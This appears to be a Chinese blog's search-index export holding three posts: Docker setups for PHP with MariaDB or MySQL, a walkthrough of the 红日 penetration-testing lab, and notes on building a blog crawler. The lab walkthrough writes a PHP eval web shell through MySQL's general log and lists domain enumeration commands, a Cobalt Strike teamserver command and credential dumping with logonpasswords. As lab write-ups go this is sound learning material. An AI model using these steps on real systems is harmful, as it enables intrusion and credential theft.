<h2 id="php7-3以上-MariaDB"><a href="#php7-3以上-MariaDB" class="headerlink" title="php7.3以上 + MariaDB"></a>php7.3以上 + MariaDB</h2><p>这个版本下面的MariaDB，不会自启动，需要进行初始化处理，同时，安装插件的过程比较抽象，某些部分也是需要看chatgpt以及文档慢慢调试</p>
<p>Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.4</span>-apache</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$PHP_INI_DIR</span>/php.ini-production&quot;</span> <span class="string">&quot;<span class="variable">$PHP_INI_DIR</span>/php.ini&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Update apt and install GD extension dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y libfreetype6-dev libjpeg62-turbo-dev libpng-dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="comment"># Install GD extension</span></span></span><br><span class="line">    docker-php-ext-configure gd --with-freetype --with-jpeg &amp;&amp; \</span><br><span class="line">    docker-php-ext-install -j$(nproc) gd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install PDO MySQL extension</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install pdo_mysql</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install MySQLi extension</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install mysqli</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install MariaDB 10.5</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y mariadb-server-core-10.5 mariadb-server-10.5 supervisor</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> /etc/init.d/mariadb start &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;CREATE USER &#x27;test&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;test&#x27;;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;GRANT ALL PRIVILEGES ON *.* TO &#x27;test&#x27;@&#x27;%&#x27; WITH GRANT OPTION;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;FLUSH PRIVILEGES;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /var/www/html</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> supervisord.conf /etc/supervisor/conf.d/supervisord.conf</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose ports</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the container&#x27;s startup command to apache2-foreground and start MariaDB service</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/supervisord&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/etc/supervisor/conf.d/supervisord.conf&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后可以进行多线程操作</p>
<p>supervisord.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[supervisord]</span><br><span class="line">nodaemon=true</span><br><span class="line"></span><br><span class="line">[program:apache2]</span><br><span class="line">command=apache2-foreground</span><br><span class="line"></span><br><span class="line">[program:mariadb]</span><br><span class="line">command=/etc/init.d/mariadb start</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="php7-2以下-MariaDB"><a href="#php7-2以下-MariaDB" class="headerlink" title="php7.2以下 + MariaDB"></a>php7.2以下 + MariaDB</h2><p>在较低版本下面的MariaDB，会直接自启动，所以并不需要多线程操作</p>
<p>较为粗糙来写的话，用下面的这个即可</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将php.ini-production重命名为php.ini</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$PHP_INI_DIR</span>/php.ini-production&quot;</span> <span class="string">&quot;<span class="variable">$PHP_INI_DIR</span>/php.ini&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新apt并安装GD扩展的依赖项</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y libfreetype6-dev libjpeg62-turbo-dev libpng-dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="comment"># 配置GD扩展</span></span></span><br><span class="line">    docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/ &amp;&amp; \</span><br><span class="line">    <span class="comment"># 安装GD扩展</span></span><br><span class="line">    docker-php-ext-install -j$(nproc) gd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装PDO MySQL扩展</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install pdo_mysql</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装MySQLi扩展</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install mysqli</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装MariaDB 10.3</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y mariadb-server-10.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置MySQL root 用户密码和创建新用户</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> service mysql start &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;UPDATE mysql.user SET Password = PASSWORD(&#x27;your_root_password&#x27;) WHERE User = &#x27;root&#x27;;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;CREATE USER &#x27;your_user&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;your_password&#x27;;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;GRANT ALL PRIVILEGES ON *.* TO &#x27;your_user&#x27;@&#x27;%&#x27; WITH GRANT OPTION;&quot;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;FLUSH PRIVILEGES;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose ports</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置容器的启动命令为apache2-foreground和启动MariaDB服务</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;apache2-foreground &amp; service mysql start &amp;&amp; tail -f /dev/null&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="php-mysql"><a href="#php-mysql" class="headerlink" title="php + mysql"></a>php + mysql</h2><p>对于不是在线进行安装的，不需要过多进行操作的，可以直接写docker-compose.yml + Dockerfile 进行处理</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.0&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  webserver:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8081:80&quot;</span></span><br><span class="line">    links:</span><br><span class="line">      - db</span><br><span class="line">    volumes:</span><br><span class="line">      - ./:/var/www/html </span><br><span class="line">  db:</span><br><span class="line">    image: mysql:<span class="number">5.6</span></span><br><span class="line">    command: --default-authentication-plugin=mysql_native_password</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: aaa</span><br><span class="line">      MYSQL_USER: aaa</span><br><span class="line">      MYSQL_PASSWORD: aaa</span><br><span class="line">      MYSQL_ROOT_PASSWORD: rootroot</span><br><span class="line">    volumes:</span><br><span class="line">      - ./mysql-init-files:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d  <span class="comment"># 放置sql文件</span></span></span><br><span class="line">    networks:</span><br><span class="line">      - default</span><br></pre></td></tr></table></figure>
<p>设置好文件以及sql文件就可以了</p>
<h2 id="多容器手法"><a href="#多容器手法" class="headerlink" title="多容器手法"></a>多容器手法</h2><p>使用links或者depends_on，就可以将多个镜像和容器进行连接，然后进行处理（超过2个可以考虑depends_on，2个只要links）</p>
<p>类似于这样，如此就不太需要怎么样进行配置，至于前面的Dockerfile写得如此复杂，是因为在本地调试的时候放在一起更加方便一些(有时间我会写成yml)</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.1&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">    image: nginx:<span class="number">1.25</span>.<span class="number">2</span>-alpine</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    volumes:</span><br><span class="line">      - ./front:/front</span><br><span class="line">      - ./conf/nginx/nginx.conf:/etc/nginx/conf.d/default.conf</span><br><span class="line">    mem_limit: <span class="number">256</span>m</span><br><span class="line">    pids_limit: <span class="number">1024</span></span><br><span class="line">    cpus: <span class="number">1</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;5000:80&quot;</span></span><br><span class="line">  waf:</span><br><span class="line">    build:</span><br><span class="line">      dockerfile: waf.Dockerfile</span><br><span class="line">      context: .</span><br><span class="line">    mem_limit: <span class="number">256</span>m</span><br><span class="line">    pids_limit: <span class="number">1024</span></span><br><span class="line">    cpus: <span class="number">1</span></span><br><span class="line">    environment:</span><br><span class="line">      - PROXY_HOST=http://api:<span class="number">5000</span></span><br><span class="line">    depends_on:</span><br><span class="line">      - api</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">  api:</span><br><span class="line">    build:</span><br><span class="line">      dockerfile: app.Dockerfile</span><br><span class="line">      context: .</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_PASSWORD: password</span><br><span class="line">    mem_limit: <span class="number">256</span>m</span><br><span class="line">    pids_limit: <span class="number">1024</span></span><br><span class="line">    cpus: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  db:</span><br><span class="line">    image: mariadb:latest</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    volumes:</span><br><span class="line">      - ./conf/db_init:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d</span></span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_USER: app</span><br><span class="line">      MYSQL_DATABASE: app</span><br><span class="line">      MYSQL_PASSWORD: password</span><br><span class="line">      MYSQL_ROOT_PASSWORD: root_password</span><br><span class="line">    cpus: <span class="number">1</span></span><br><span class="line">    pids_limit: <span class="number">256</span></span><br><span class="line">    mem_limit: <span class="number">512</span>m</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场</title>
    <url>/2023/11/02/23-58-04/</url>
    <content><![CDATA[<h1>红日靶场</h1>
<span id="more"></span>
<h2 id="红日-一">红日(一)</h2>
<h3 id="环境搭建">环境搭建</h3>
<p>存在三台机器，win7，win2008，win2003，然后根据下面的文章进行搭建即可</p>
<p>不过为了方便攻击，可以将其中的NAT设置为独立的网卡，然后设置一台kali共享更好一些</p>
<p>[<a href="https://blog.51cto.com/u_15302226/5189485">WEB安全]红日靶场（一）环境搭建_四海之水皆立的技术博客_51CTO博客</a></p>
<h3 id="外点">外点</h3>
<p>nmap扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure>
<p>存在80端口服务以及mysql数据库</p>
<p>web服务是phpstudy探针</p>
<p>并且在mysql链接的时候可以直接使用root/root进行链接，弱密码</p>
<p><img src="/img/image-20231103002523846.png" alt="image-20231103002523846" /></p>
<p>同时dirb扫描出来存在phpmyadmin的后台</p>
<p><img src="/img/image-20231103002453755.png" alt="image-20231103002453755" /></p>
<p>进入phpmyadmin的后台，可以进行查看mysql的各种配置，尝试进行提权和注入shell</p>
<p><a href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权 | 国光 (sqlsec.com)</a></p>
<p><img src="/img/image-20231103004630673.png" alt="image-20231103004630673" /></p>
<p>secure_file_priv值为空，不允许读取任意文件</p>
<p><img src="/img/image-20231103210331570.png" alt="image-20231103210331570" /></p>
<p>使用log进行注入，数据库存在newyxcms</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;C:\phpStudy\www\yxcms\shell.php&#x27;;</span><br><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_POST[&quot;aaa&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
<p>然后蚁剑连接即可</p>
<h3 id="内网">内网</h3>
<p>然后进行内网的信息收集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all   查看本机ip，所在域</span><br><span class="line">route print     打印路由信息</span><br><span class="line">net view        查看局域网内其他主机名</span><br><span class="line">arp -a          查看arp缓存</span><br><span class="line">net start       查看开启了哪些服务</span><br><span class="line">net share       查看开启了哪些共享</span><br><span class="line">net share ipc$  开启ipc共享</span><br><span class="line">net share c$    开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;   与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;  建立c盘共享</span><br><span class="line">dir \\192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件</span><br><span class="line">​</span><br><span class="line">net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 查看本机用户列表</span><br><span class="line">net user /domain         查看域用户</span><br><span class="line">net localgroup administrators   查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         查看有几个域</span><br><span class="line">net user 用户名 /domain   获取指定域用户的信息</span><br><span class="line">net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>
<p>发现存在的52网段，进行横向</p>
<p><img src="/img/image-20231103234849619.png" alt="image-20231103234849619" /></p>
<p>首先进行CS上线操作，kali运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./teamserver 192.168.58.128 cs123456</span><br></pre></td></tr></table></figure>
<p>主机连接之后，生成payload</p>
<p><img src="/img/image-20231103235835730.png" alt="image-20231103235835730" /></p>
<p>然后进行上线</p>
<p>之后在下面的命令行中进行信息收集和渗透</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep 0  // 减少回显时间</span><br><span class="line">shell whoami</span><br><span class="line">shell systeminfo //信息收集</span><br><span class="line">logonpasswords  //拿明文密码</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>如何制作一个爬虫</title>
    <url>/2023/12/05/15-24-52/</url>
    <content><![CDATA[<h1></h1>
<h1>如何制作一个爬虫</h1>
<span id="more"></span>
<h2 id="blog">blog</h2>
<p>对于爬取blog，最大的问题是什么？</p>
<ol>
<li>对于各种框架主题的blog，出现的url会多种多样，一部分是使用时间进行命名，一部分是使用文章题目进行命名，那么久需要分情况进行处理，初步解决办法只能根据框架和具体爬取的站点进行处理和选择模式，本质上还是逃不过这个问题，也有的使用title进行命名，但是对于复杂状态的命名方式，也不能保证爬取下来的文件符合使用者的预期</li>
<li>html转md，对于这个问题，很头痛，因为对于防御xss的编码，使用者对于原本字符的转化以及框架对于blog的生成方式的处理也是不相同，对于不同的作用域是否需要进行解码，可能解码之后会导致原本就应该是&amp;gt的字符变成解码之后的情况，也可能出现xss防御转码的字符留下，给使用者一脸疑惑（尚未解决）</li>
<li>嵌套格式以及code，对于喜欢使用md写blog的，不可避免是需要使用```进行代码处理，以及着重号，但是一个是单符号，一个是三符号，对于这种情况的处理也是问题，暂时我也是直接暴力处理，依旧存在bug，对于被code格式包含的情况下再写那三个符号的话，会出现一些不可避免的格式错乱的情况，例如遇到python的多行字符串，或者在绕waf的情况使用了这些符号，也会在处理的时候出现问题（暂时在普通情况下不会出现，但是极端情况下依旧存在问题，可以修）</li>
</ol>
<h2 id="test">test</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;</span><br><span class="line">&gt;</span><br><span class="line">```</span><br><span class="line">&amp;lt;</span><br><span class="line">&amp;gt;</span><br><span class="line"></span><br><span class="line">&amp;amp;gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
</search>
